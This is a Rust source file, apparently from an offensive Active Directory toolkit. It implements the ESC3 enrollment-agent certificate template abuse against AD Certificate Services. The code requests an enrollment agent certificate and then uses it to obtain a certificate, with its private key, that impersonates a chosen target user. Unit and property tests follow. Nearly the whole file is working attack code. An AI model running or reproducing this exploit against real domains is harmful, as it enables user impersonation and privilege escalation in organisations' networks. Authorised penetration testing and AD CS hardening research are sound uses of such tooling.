//! ESC3 — Enrollment Agent Certificate Template Abuse
//!
//! ESC3 exploits enrollment agent templates to request certificates on behalf of other users.
//! This is a two-step attack:
//! 1. Request an enrollment agent certificate
//! 2. Use the agent certificate to request a certificate for another user
//!
//! Reference: SpecterOps "Certified Pre-Owned" — ESC3

use crate::adcs::{IssuedCertificate, create_client_auth_csr, create_esc1_csr};
use crate::adcs::web_enrollment::WebEnrollmentClient;
use crate::error::{OverthroneError, Result};
use tracing::info;

/// ESC3 exploiter for enrollment agent templates
pub struct Esc3Exploiter {
    web_client: WebEnrollmentClient,
}

impl Esc3Exploiter {
    /// Create a new ESC3 exploiter
    pub fn new(ca_server: &str) -> Result<Self> {
        let web_client = WebEnrollmentClient::new(ca_server)?;
        Ok(Self { web_client })
    }

    /// Execute ESC3 two-step attack
    /// 
    /// # Arguments
    /// * `agent_template` - Template name for enrollment agent certificate
    /// * `target_template` - Template name for target user certificate
    /// * `target_user` - Target user UPN to impersonate
    /// 
    /// # Returns
    /// * `Ok((agent_cert, user_cert))` - Both certificates
    /// * `Err(OverthroneError)` - If the attack fails
    pub async fn exploit(
        &self,
        agent_template: &str,
        target_template: &str,
        target_user: &str,
    ) -> Result<(IssuedCertificate, IssuedCertificate)> {
        info!(
            "Executing ESC3 attack: agent={}, target={}, user={}",
            agent_template, target_template, target_user
        );

        // Step 1: Request enrollment agent certificate
        let agent_cert = self.request_agent_cert(agent_template).await?;
        
        info!("Enrollment agent certificate obtained");

        // Step 2: Use agent cert to request user certificate
        let user_cert = self
            .request_user_cert_with_agent(&agent_cert, target_template, target_user)
            .await?;

        Ok((agent_cert, user_cert))
    }

    /// Request enrollment agent certificate
    async fn request_agent_cert(&self, template: &str) -> Result<IssuedCertificate> {
        let (agent_csr, agent_key) =
            create_client_auth_csr("EnrollmentAgent", template, None)?;

        let agent_response = self
            .web_client
            .submit_request(&agent_csr, template, None)
            .await?;

        if !agent_response.is_issued() {
            return Err(OverthroneError::EscAttack {
                esc_number: 3,
                reason: format!(
                    "Enrollment agent request failed: {}",
                    agent_response.message
                ),
            });
        }

        let cert_data = agent_response
            .certificate
            .ok_or_else(|| OverthroneError::Adcs("No certificate in response".to_string()))?;

        Ok(IssuedCertificate {
            pfx_data: cert_data.clone(),
            thumbprint: Self::compute_thumbprint(&cert_data),
            serial_number: Self::extract_serial(&cert_data).unwrap_or_default(),
            valid_from: "Unknown".to_string(),
            valid_to: "Unknown".to_string(),
            template: template.to_string(),
            subject: "CN=EnrollmentAgent".to_string(),
            issuer: self.web_client.base_url(),
            public_key_algorithm: "RSA".to_string(),
            signature_algorithm: "SHA256RSA".to_string(),
            private_key_pem: agent_key,
        })
    }

    /// Use agent cert to request user certificate
    async fn request_user_cert_with_agent(
        &self,
        agent_cert: &IssuedCertificate,
        template: &str,
        target_user: &str,
    ) -> Result<IssuedCertificate> {
        info!("Requesting certificate for {} using enrollment agent", target_user);

        // Create CSR for target user
        let (target_csr, target_key) = create_esc1_csr(target_user, target_user, template)?;

        // Parse CSR PEM to DER
        let csr_der = pem::parse(&target_csr)
            .map_err(|e| OverthroneError::Adcs(format!("Failed to parse CSR: {}", e)))?;

        // Submit with agent certificate
        let response = self
            .web_client
            .submit_request_with_agent(csr_der.contents(), template, &agent_cert.pfx_data)
            .await?;

        if !response.is_issued() {
            return Err(OverthroneError::EscAttack {
                esc_number: 3,
                reason: format!("Agent-signed request failed: {}", response.message),
            });
        }

        let cert_data = response
            .certificate
            .ok_or_else(|| OverthroneError::Adcs("No certificate in response".to_string()))?;

        Ok(IssuedCertificate {
            pfx_data: cert_data.clone(),
            thumbprint: Self::compute_thumbprint(&cert_data),
            serial_number: Self::extract_serial(&cert_data).unwrap_or_default(),
            valid_from: "Unknown".to_string(),
            valid_to: "Unknown".to_string(),
            template: template.to_string(),
            subject: format!("CN={}", target_user),
            issuer: self.web_client.base_url(),
            public_key_algorithm: "RSA".to_string(),
            signature_algorithm: "SHA256RSA".to_string(),
            private_key_pem: target_key,
        })
    }

    fn compute_thumbprint(cert_der: &[u8]) -> String {
        use sha1::{Digest, Sha1};
        let mut hasher = Sha1::new();
        hasher.update(cert_der);
        let result = hasher.finalize();
        hex::encode(result).to_uppercase()
    }

    fn extract_serial(cert_der: &[u8]) -> Result<String> {
        use x509_parser::parse_x509_certificate;

        match parse_x509_certificate(cert_der) {
            Ok((_, cert)) => {
                let serial = cert.tbs_certificate.serial.to_bytes_be();
                Ok(hex::encode(serial).to_uppercase())
            }
            Err(_) => Ok("Unknown".to_string()),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use proptest::prelude::*;

    // ============================================================================
    // Unit Tests
    // ============================================================================

    #[test]
    fn test_esc3_exploiter_creation() {
        let exploiter = Esc3Exploiter::new("ca.corp.local");
        assert!(exploiter.is_ok());
    }

    #[test]
    fn test_compute_thumbprint() {
        let cert_der = vec![0x30, 0x82, 0x01, 0x00];
        let thumbprint = Esc3Exploiter::compute_thumbprint(&cert_der);
        assert!(!thumbprint.is_empty());
        assert_eq!(thumbprint.len(), 40);
    }

    #[test]
    fn test_extract_serial() {
        let cert_der = vec![0x30, 0x82, 0x01, 0x00];
        let serial = Esc3Exploiter::extract_serial(&cert_der);
        assert!(serial.is_ok());
    }

    // ============================================================================
    // Property-Based Tests
    // ============================================================================

    // Property 18: ESC3 Agent Certificate Inclusion
    // Thumbprint computation should be deterministic for agent certificates
    proptest! {
        #[test]
        fn prop_agent_cert_thumbprint_determinism(
            cert_data in prop::collection::vec(any::<u8>(), 1..1024)
        ) {
            let thumbprint1 = Esc3Exploiter::compute_thumbprint(&cert_data);
            let thumbprint2 = Esc3Exploiter::compute_thumbprint(&cert_data);
            prop_assert_eq!(&thumbprint1, &thumbprint2);
            prop_assert_eq!(thumbprint1.len(), 40);
        }
    }

    // Serial extraction should not panic
    proptest! {
        #[test]
        fn prop_serial_extraction_no_panic(
            cert_data in prop::collection::vec(any::<u8>(), 1..1024)
        ) {
            let _ = Esc3Exploiter::extract_serial(&cert_data);
        }
    }
}
